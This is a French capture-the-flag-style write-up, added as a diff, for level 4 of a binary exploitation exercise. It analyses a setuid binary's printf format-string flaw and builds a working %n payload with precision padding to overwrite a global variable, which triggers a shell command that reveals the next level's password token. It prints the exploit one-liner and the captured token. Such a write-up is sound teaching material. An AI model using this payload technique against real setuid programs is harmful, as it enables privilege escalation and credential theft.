@@ -1,0 +1,92 @@
+# Level 4
+## Résumé
+Contrôle chaine de format `printf` => `%n` => inscrire grand nombre dans `m` à l'aide de la précision des conversions => appel à `system(bin/sh)`.
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+$> file level4 
+level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
+```
+Le home contient un binaire appartenant à l'user `level5` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/level5/.pass`.
+
+On récupère le fichier `level4` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 level4@10.11.200.192:/home/user/level4/level4 .
+$> r2 level4
+```
+![level4_disassembled](Ressources/level4_disassembled.png)
+
+## Analyse
+### Analyse du programme
+La fonction `main` appel la fonction `n` (`0x080484ad`).
+
+La fonction `n` met en place un buffer de caractère d'une taille de `520 octets` (`; var char *s @ ebp-0x208`).  
+Il est utilisé par `fgets` pour lire depuis l'entrée standard une chaine de caractères de maximum `512 octets` (`mov dword [size], 0x200`).
+Cette chaine de caractères est ensuite passée à la fonction `p` pour être donné à `printf` en chaîne de format. Comme dans le `level3`, nous nous retrouvons avec la même faille de sécurité.  
+Si la variable globale `m` a pour valeur `16930116` (`cmp eax, 0x1025544`), un appel à `system` `/bin/cat /home/user/level5/.pass` est effectué (`0x080484a0`), ce qui permet d'avoir directement le token.  
+On doit donc modifier la valeur de `m` grâce à la faille de sécurité de `printf`.
+### Mise en place de l'exploitation
+Toujours en utilisant la conversion `%n`, nous allons mettre au début du buffer l'adresse de `m`.
+Il faut cependant calculer l'espace ce trouvant entre le début du buffer et l'adresse sur laquelle pointe le premier arguement de printf. Cet espace est plus grand que celui du `level3` car nous avons un appel de fonction supplémentaire (la fonction `p`) entre le buffer et l'appel de `printf`.
+
+L'état de la stack au momemt de l'appel de `printf` est dans ce état :
+génère ceci dans la stack :
+```
+   ... 
+            |-----------|
+          / |  ret addr |
+         /  |-----------|
+        /   |   sbp     |  (n's return addres)
+       |    |-----------|
+       |    |  n        |
+  n   -|    |  local    |
+stack  |    |  variables| 
+frame  |    |-----------|
+       |    |    s      |  (buffer)
+       |    |-----------|
+       |    |   size    |
+        \   |-----------|
+         \  |  stream   |
+          \ |-----------|
+           \|   arg     +--> Pointer vers s (buffer)
+         /  |-----------|
+        /   | ret addr  |  (p's return addres)
+p      /    |-----------|
+stack |     |    sbp    | <- ebp
+frame \     |-----------|
+       \    |  p        |
+        \   |  local    | taille: 0x18
+         \  |  variables| <- esp et addresse où pointe le 1er argument de printf
+          \ |-----------|
+           \|   arg     +--> Pointer vers s (buffer)
+         /  |-----------|
+        /   | ret addr  |  (printf's return addres)
+printf /    |-----------|
+stack |     |    sbp    | <- ebp
+frame  \    |-----------|
+        \   |  printf   |
+         \  |  local    |
+          \ |  variables| <- esp
+	        '-----------'
+
+
+```
+Nous voyons que le 1er argument de `printf` pointe sur l'adresse `esp` de la fonction `p`. Sa stack est de taille `0x18`, puis nous devons remonter en mémoire jusqu'au buffer, soit au total 44 bytes (ou 11 int).  
+Nous pouvons contruire notre injection de la sorte :
+```sh
+python -c 'print("\x10\x98\x04\x08"+"%x"*11+"%n\n")';
+```
+Nous devons maintenant mettre le bon nombre de caractère pour que la bonne valeur soit inscrite dans `m`. Cette valeur est `16930116` - `les 4 caractères de l'adresse de m` = `16930112`.  
+Nous avons 11 int, donc nous divisons cette valeur par 11 : `16930112 / 11 = 1539101` et reste `1`.  
+Le reste est complété par la lettre "A", ce qui donne :
+```sh
+python -c 'print("\x10\x98\x04\x08"+"A"+"%.1539101x"*11+"%n\n")';
+```
+
+## Application
+```sh
+$> (python -c 'print("\x10\x98\x04\x08"+"A"+"%.1539101x"*11+"%n\n")'; cat -) | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
